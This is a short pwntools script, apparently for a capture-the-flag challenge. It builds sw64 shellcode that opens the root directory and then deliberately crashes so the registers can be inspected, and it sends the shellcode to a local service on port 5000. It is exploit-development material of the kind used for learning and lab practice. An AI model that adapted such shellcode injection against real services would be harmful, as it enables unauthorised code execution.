from pwn import *
from sw64 import *
context.log_level = "error" #get rid of annoying connect disconnect prints
crashing_code = b"\x00\x00\x11\x74"

def attempt(shellcode):
    with remote("localhost", 5000) as r:
        r.recvuntil(b"(0 to use the builtin): ")
        r.sendline(f"{len(shellcode)}".encode())
        r.recvuntil(b"bytes of shellcode: ")
        r.send(shellcode)
        return r.clean(timeout=0.5)

if __name__ == "__main__":
    data_offset = 0x100
    # Code
    payload = ldq(v0, t12, data_offset) # load syscall no for open into v0
    payload += ldq(a0, t12, data_offset+0x8) # load offset to string "/" into a0
    payload += add(a0, t12, a0) # add start of our memory page to turn offset into address
    payload += mov(a1, zero_reg) # set a1 to 0, this corresponds to opening the file read only
    payload += syscall_0() # issue syscall - open("/", O_RDONLY)
    payload += crashing_code #Crash so we can read registers
    # Padding
    payload += b"\x00"*(data_offset-len(payload)) # pad to data_offset length
    # Data
    payload += p64(45) # syscall_open
    payload += b"/\0\0\0" # "/"
    print(attempt(payload).decode())